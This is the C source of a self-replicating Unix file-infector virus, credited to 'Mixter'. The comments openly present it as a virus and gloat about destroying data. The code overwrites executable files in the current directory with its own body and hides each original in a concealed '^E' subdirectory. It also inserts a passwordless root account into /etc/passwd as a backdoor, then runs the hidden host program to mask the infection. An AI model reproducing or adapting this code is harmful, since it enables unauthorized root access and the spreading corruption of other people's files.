
/* http://members.xoom.com/i0wnu - code copyright by Mixter */

/* OK, ummm, this virus finally works. Some broken things are the
   search structure, it will only infect relative paths. However, it
   works quite fast. I added a parameter "virulence" that is used
   to determine the number of attempted infections per run.
   This virus is *really* simple, it searches for files with write
   permission by brute force trying to infect files. It will then
   overwrite the file with its own code, thus marking it as infected.
   The default "malicious" action is to add a uid 0 user to /etc/passwd.
   Right now, for some strange reason, it just duplicates the last entry
   in the passwd file.                  -- Mixter */

/* PS: Every infected dir will contain a little fuzz directory
   called ? (actually ^E). Have fun destroying your valuable data. :P */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
int virulence=5;
DIR *dirp;                            /* directory search structure */
struct dirent *dp;                    /* directory entry record */
struct stat st;                       /* file status record */
int stst;                             /* status-call status */
FILE *host,*virus, *pwf;              /* host/virus/passwd file */
long FileID;                          /* 1st 4 bytes of host */
char buf[512];                        /* buffer for disk reads/writes */
char *lc,*ld;                         /* used to search for virus */
size_t amt_read,hst_size;             /* amount read from file, host size */
size_t vir_size=13264;                /* size of virus, in bytes */
char dirname[10];                     /* subdir where virus stores itself */
char hst[512];

/* line being added to /etc/passwd */
char mixter[]="mixter::0:0:root:/:/bin/sh";

void readline() {
  lc=&buf[1];
  buf[0]=0;
  while (*(lc-1)!=10) {
    fread(lc,1,1,pwf);
    lc++;
    }
  }

void writeline() {
  lc=&buf[1];
  while (*(lc-1)!=10) {
    fwrite(lc,1,1,host);
    lc++;
    }
  }

int main(argc, argv, envp) /* use evironment pathname, ANSI compliant */
  int argc; char *argv[], *envp[];
  { eviloop:
    strcpy((char *)&dirname,"./\005");         /* get host directory */
    dirp=opendir(".");                              /* begin directory search */
    while ((dp=readdir(dirp))!=NULL) {           /* have a file, check it out */
      if ((stst=stat((const char *)&dp->d_name,&st))==0) {      /* get status */
        lc=(char *)&dp->d_name;
        while (*lc!=0) lc++;
        lc=lc-3;                    /* lc points to last 3 chars in file name */
        if ( ((!((*lc=='X')&&((*lc)++=='2')&&((*lc)++=='3')))) )
         if ((st.st_mode&S_IXUSR)!=0)
         {
          strcpy((char *)&buf,(char *)&dirname);
          strcat((char *)&buf,"/");
          strcat((char *)&buf,(char *)&dp->d_name);        /* see if infected file */
          strcat((char *)&buf,".fuzz");                      /* exists already */
          if ((host=fopen((char *)&buf,"r"))!=NULL) fclose(host);
          else {                                   /* no it doesn't - infect! */
            host=fopen((char *)&dp->d_name,"r");
            fseek(host,0L,SEEK_END);                   /* determine host size */
            hst_size=ftell(host);
            fclose(host);
            if (hst_size>=vir_size) {        /* host must be large than virus */
              mkdir((char *)&dirname,S_IRWXU|S_IRWXG|S_IRWXO);
              rename((char *)&dp->d_name,(char *)&buf);        /* rename host */
              if ((virus=fopen(argv[0],"r"))!=NULL) {
                if ((host=fopen((char *)&dp->d_name,"w"))!=NULL) {
                  while (!feof(virus)) {            /* and copy virus to orig */
                    amt_read=512;                                /* host name */
                    amt_read=fread(&buf,1,amt_read,virus);
                    fwrite(&buf,1,amt_read,host);
                    hst_size=hst_size-amt_read;
                    }
                  fwrite(&buf,1,hst_size,host);
                  fclose(host);
                  chmod((char *)&dp->d_name,S_IRWXU|S_IRWXG|S_IRWXO);
                  strcpy((char *)&buf,(char *)&dirname);
                  strcpy((char *)&buf,"/");
                  strcat((char *)&buf,(char *)&dp->d_name);
                  chmod((char *)&buf,S_IRWXU|S_IRWXG|S_IRWXO);
                  }
                else
                  rename((char *)&buf,(char *)&dp->d_name);
                fclose(virus);                  /* infection process complete */
                }
              else
                rename((char *)&buf,(char *)&dp->d_name);
              }
            }
          }
        }
      }
/* INSERT YOUR FUNCTION HERE IF ANY */
    (void)closedir(dirp);          /* infection process complete for this dir */
                                /* now see if we can get at the password file */
    if ((pwf=fopen("/etc/passwd","r+"))!=NULL) {
      host=fopen("/etc/.pw","w");                       /* temporary file */
      stst=0;
      while (!feof(pwf)) {
        readline();                        /* scan the file for user "mixter" */
        lc=&buf[1];
        if ((*lc=='m')&&(*(lc+1)=='i')&&(*(lc+2)=='x')&&(*(lc+3)=='t')&&
            (*(lc+4)=='e')&&(*(lc+5)=='r')) stst=1;
        writeline();
        }
      if (stst==0) {                                  /* if no "mixter" found */
        strcpy((char *)&buf[1],(char *)&mixter);                   /* add it */
        lc=&buf[1]; while (*lc!=0) lc++;
        *lc=10;
        writeline();
        }
      fclose(host);
      fclose(pwf);
      rename("/etc/.pw","/etc/passwd");    /* update passwd */
      }
    strcpy((char *)&buf,argv[0]);          /* the host is this program's name */
    lc=(char *)&buf;                            /* find end of directory path */
    while (*lc!=0) lc++;
    while (*lc!='/') lc--;
    *lc=0; lc++;
    strcpy((char *)&hst,(char *)&buf);
    ld=(char *)&dirname+1;                         /* insert the ^E directory */
    strcat((char *)&hst,(char *)ld);          /* and put file name on the end */
    strcat((char *)&hst,"/");
    strcat((char *)&hst,(char *)lc);
    strcat((char *)&hst,".fuzz");                      /* with virus tacked on */
    execve((char *)&hst,argv,envp);            /* execute this program's host */
    virulence--;
    if(virulence==0) return 0; else goto eviloop;
}
